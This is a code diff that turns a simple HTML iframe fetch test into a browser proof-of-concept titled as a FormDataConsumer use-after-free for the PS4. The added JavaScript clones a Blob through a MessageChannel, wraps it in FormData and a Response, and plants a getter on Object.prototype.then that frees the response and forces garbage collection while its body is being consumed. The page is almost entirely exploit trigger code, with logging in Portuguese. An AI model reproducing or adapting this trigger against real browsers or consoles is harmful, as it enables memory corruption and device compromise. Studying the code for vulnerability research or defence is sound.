@@ -1,36 +1,102 @@
-
 <!DOCTYPE html>
 <html>
+<head>
+    <title>FormDataConsumer UAF - PS4 PoC</title>
+</head>
 <body>
+<pre id="log"></pre>
 <script>
-const iterations = 25;
-let n = 0;
-
-function runTest(win) {
-    if (!win.fetch) return;
-    win.fetch("data:text/plain,TEST").catch(function() {});
+function log(msg) {
+    document.getElementById('log').textContent += msg + '\n';
+    console.log(msg);
 }
 
-function round() {
-    const frame = document.createElement("iframe");
-    document.body.appendChild(frame);
+function gc() {
+    function gcRec(n) {
+          if (n < 1)
+              return {};
+          var temp = {i: "ab" + i + (i / 100000)};
+          temp += "foo";
+          gcRec(n-1);
+    }
+    for (var i = 0; i < 10000; i++)
+    gcRec(10);
+}
 
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function createClonedBlob() {
+    return new Promise(function(resolve, reject) {
+        var channel = new MessageChannel();
+
+        channel.port1.onmessage = function(e) {
+            gc();
+            resolve(e.data);
+        };
+
+        channel.port1.onmessageerror = function() {
+            reject(new Error('MessageChannel clone failed'));
+        };
+
+        channel.port2.postMessage(new Blob(['aa']));
+    });
+}
+
+function cleanupPrototype() {
     try {
-        runTest(frame.contentWindow);
+        delete Object.prototype.then;
     } catch(e) {
-        console.log("ERROR:", e.message);
-    }
-
-    frame.remove();
-
-    if (++n < iterations) {
-        setTimeout(round, 0);
-    } else {
-        document.body.innerHTML += "<p>TEST FINISHED</p>";
+        // Se delete falhar (non-configurable), redefine como undefined
+        try {
+            Object.defineProperty(Object.prototype, 'then', {
+                value: undefined,
+                configurable: true,
+                writable: true
+            });
+        } catch(e2) {}
     }
 }
 
-onload = round;
+async function triggerUAF() {
+    log('[*] Criando Blob clonado via MessageChannel...');
+    var blob = await createClonedBlob();
+    log('[*] Blob clonado recebido: ' + blob.size + ' bytes');
+
+    await sleep(100);
+
+    var formData = new FormData();
+    formData.append('a', blob);
+    log('[*] FormData construído com o blob');
+
+    var response = new Response(formData);
+    log('[*] Response criado, armando prototype getter...');
+
+    Object.defineProperty(Object.prototype, 'then', {
+        get: function() {
+            log('[!] Getter .then disparado — nullando response e chamando gc()');
+            response = null;
+            gc();
+            return undefined;
+        },
+        configurable: true,  // permite deletar/redefinir depois
+        enumerable:   false
+    });
+
+    log('[*] Chamando response.arrayBuffer() — iniciando consume...');
+    response.arrayBuffer();
+
+    await sleep(1000);
+
+    cleanupPrototype();
+    log('[*] Concluído sem crash aparente (bug pode estar patchado ou timing errado)');
+}
+
+triggerUAF().catch(function(e) {
+    cleanupPrototype();
+    log('[!] Erro: ' + e.message);
+});
 </script>
 </body>
 </html>
